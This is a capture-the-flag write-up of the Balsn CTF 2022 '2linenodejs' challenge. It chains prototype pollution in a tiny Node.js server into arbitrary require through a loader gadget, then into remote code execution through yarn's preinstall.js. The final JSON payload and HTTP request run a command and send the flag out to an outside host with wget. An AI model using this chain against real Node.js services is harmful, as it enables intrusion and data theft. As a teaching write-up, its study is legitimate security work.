# Balsn CTF 2022 - 2linenodejs

## Challenge

### Goal

RCE

### Environment Setup

The challenge is running `server.js` with `socat` on port 1337


```bash
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:'./server.js'
```


The docker image used is `node:18.8.0-alpine3.16`

### Files


```
app
├── index.js
├── server.js
└── usage.js
```

#### server.js
```javascript
#!/usr/local/bin/node
process.stdin.setEncoding('utf-8');
process.stdin.on('readable', () => {
  try{
    console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
    const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
    obj = JSON.parse(json);
    console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));
  }catch{
    require('./usage')
  }finally{
    process.exit();
  }
});
```

#### index.js
```javascript
module.exports=(O,o) => (Object.entries(O).forEach(([K,V])=>Object.entries(V).forEach(([k,v])=>(o[K]=o[K]||{},o[K][k]=v))), o);
```

#### usage.js
```javascript
console.log('Validate your JSON with <a href="/?{}">query</a>');
```

## Solution

### Prototype Pollution
First, there is obviously a Prototype Pollution vulnerability in `index.js`

```javascript
module.exports=(O,o) => (
    Object.entries(O).forEach(([K,V])=>
        Object.entries(V).forEach(([k,v])=>
            (o[K]=o[K]||{},o[K][k]=v)
        )
    ), o
);
```

For example, one such HTTP request can pollute the base prototype's attribute `x` to `y`
```http
GET /?{"__proto__":{"x":"y"}} HTTP/1.1
Host: 2linenodejs.balsnctf.com
```

### Local File Inclusion

The server is run with `socat`, each connection will creat a new process, so the prototype pollution can only affect what is in that connection. After prototype pollution, only two things may happen before `process.exit()`, `console.log` or `require('. /usage')`.

Since there is not much we can affect in `console.log`, the goal here is to cause some errors so that we can execute `require('. /usage')`.

There are many ways to cause an error, for example, `console.log` takes the first parameter as a format string, so if we pollute the `toString` attribute and then include a `%o` in our JSON, when `console.log` calls `toString` internally, it will cause an error.

However, by polluting `toString`, it may cause an error after the fact. A better approach would be to raise an error in `index.js`, for example `{"__proto__":{"__proto__":{}}` would raise an error because the prototype of the base prototype cannot be changed, it must be `null`.

The next step is to find the usable gadget in the `require` function. By reading the source code of Node.js 18.8.0, we can find that if there is no `package.json` in current path or parrent path, we can change the require file by polluting `data`, `data.name`, `data.exports` and `path` at [trySelf](https://github.com/nodejs/node/blob/7dd2f41c7385538a1d7de531490afe2acbb0daf6/lib/internal/modules/cjs/loader.js#L461)

```javascript=458
function trySelf(parentPath, request) {
  if (!parentPath) return false;

  const { data: pkg, path: pkgPath } = readPackageScope(parentPath) || {};
  if (!pkg || pkg.exports === undefined) return false;
  if (typeof pkg.name !== 'string') return false;
...
```

For example, the following payload will result in a prototype pollution, then cause an error and then require `/app/server.js`.

```JSON
{
   "__proto__":{
      "data":{
         "name":"./usage",
         "exports":"./server.js"
      },
      "path":"/app/",
      "__proto__":{
         "x":1
      }
   }
}
```



### From LFI to RCE

After Prototype Pollution and arbitrary require, the next step is to search through files in `node:18.8.0-alpine3.16`. To my surprise, there are many files that may give us RCE, the file I use is `/opt/yarn-v1.22.19/preinstall.js`.


The following code is the first few lines of `preinstall.js`
```javascript
if (process.env.npm_config_global) {
    var cp = require('child_process');
    var fs = require('fs');
    var path = require('path');

    try {
        var targetPath = cp.execFileSync(process.execPath, [process.env.npm_execpath, 'bin', '-g'], {
            encoding: 'utf8',
            stdio: ['ignore', undefined, 'ignore'],
        }).replace(/\n/g, '');
...
```

Here's a little trick worth mentioning, since Node.js's `require` is actually using `vm` to run code,  we can set global variables by polluting `contextExtensions`, including `process`.


So we can controll `process.env.npm_config_global`, `process.execPath` and `process.env.npm_execpath` through

```JSON
{
   "__proto__":{
      "contextExtensions":[
         {
            "process":{
               "env":{
                  "npm_config_global":"1",
                  "npm_execpath":""
               },
               "execPath":"xxxx"
            }
         }
      ]
   }
}
```

But even if we can controll the executable and the first parameter of `execFileSync`, it is still a bit difficult to use, so the last step is to pollute the `shell` of `execFileSync` to `sh`, so that we can write arbitrary command directly in `process.execPath`.


Finally, chain everything above together, the final payload is 

```JSON
{
   "__proto__":{
      "data":{
         "name":"./usage",
         "exports":"./preinstall.js"
      },
      "path":"/opt/yarn-v1.22.19/",
      "shell":"sh",
      "contextExtensions":[
         {
            "process":{
               "env":{
                  "npm_config_global":"1",
                  "npm_execpath":""
               },
               "execPath":"wget\u0020http://1.3.3.7/?p=$(/readflag);echo"
            }
         }
      ],
      "__proto__":{
         "x":1
      }
   }
}
```

HTTP request:
```http
GET /?{"__proto__":{"data":{"name":"./usage","exports":"./preinstall.js"},"path":"/opt/yarn-v1.22.19/","shell":"sh","contextExtensions":[{"process":{"env":{"npm_config_global":"1","npm_execpath":""},"execPath":"wget\u0020http://1.3.3.7/?p=$(/readflag);echo"}}],"__proto__":{"x":1}}} HTTP/1.1
Host: 2linenodejs.balsnctf.com
```
